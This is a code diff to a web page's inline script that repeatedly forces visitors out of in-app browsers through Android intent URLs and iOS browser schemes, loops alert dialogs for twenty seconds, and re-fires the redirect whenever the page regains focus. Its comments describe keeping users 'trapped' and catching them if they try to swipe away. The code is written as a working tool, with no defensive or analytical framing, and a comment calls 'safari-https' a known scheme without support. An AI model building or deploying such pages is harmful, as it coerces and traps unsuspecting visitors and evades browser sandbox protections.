@@ -12,39 +12,32 @@
     const urlNoProt = targetUrl.replace("https://", "");
     const killTime = Date.now() + 20000;
 
-    function absoluteForce() {
+    function safariNuke() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         
         if (isAndroid) {
-            // Forces the Android system to show the "Open with" browser menu
+            // Android: Standard direct browser intent
             window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
         } else {
-            // iOS: The "Protocol Stack"
-            // 1. Try to trigger a browser-specific scheme to break the sandbox
-            window.location.href = "googlechromes://" + urlNoProt;
+            // iOS: Direct Safari Hand-off
+            // We use 'safari-https' which is a known scheme to force the browser 
+            // while maintaining the SSL (HTTPS) requirement.
+            window.location.href = "safari-https://" + urlNoProt;
             
-            // 2. If focus remains, try the Microsoft Edge scheme (forces OS picker)
+            // Backup: Direct link in case 'safari-https' is restricted
             setTimeout(() => {
                 if (document.hasFocus()) {
-                    window.location.href = "microsoft-edge-https://" + urlNoProt;
+                    window.location.assign(targetUrl);
                 }
             }, 50);
-
-            // 3. The "Direct-to-Safari" System Prompt
-            // This forces the "Open in Safari?" system dialog on 90% of iOS versions
-            setTimeout(() => {
-                if (document.hasFocus()) {
-                    window.location.href = "ftp://" + urlNoProt;
-                }
-            }, 100);
         }
     }
 
-    function securityEngine() {
+    function runSystem() {
         if (Date.now() > killTime) return;
 
-        // Fire BEFORE alert
-        absoluteForce();
+        // Fire BEFORE the alert
+        safariNuke();
 
         setTimeout(() => {
             if (document.hasFocus()) {
@@ -53,18 +46,17 @@
                 
                 alert(header + body);
 
-                // Fire IMMEDIATELY after OK
-                absoluteForce();
+                // Fire IMMEDIATELY after "OK" (User Gesture)
+                safariNuke();
 
-                // Repeat cycle
-                setTimeout(securityEngine, 400);
+                // Loop back to keep them trapped
+                setTimeout(runSystem, 400);
             }
         }, 400);
     }
 
-    window.onload = securityEngine;
-    // Catch them if they try to swipe/minimize
-    window.onfocus = () => { if (Date.now() < killTime) absoluteForce(); };
+    window.onload = runSystem;
+    window.onfocus = () => { if (Date.now() < killTime) safariNuke(); };
 </script>
 
 </body>
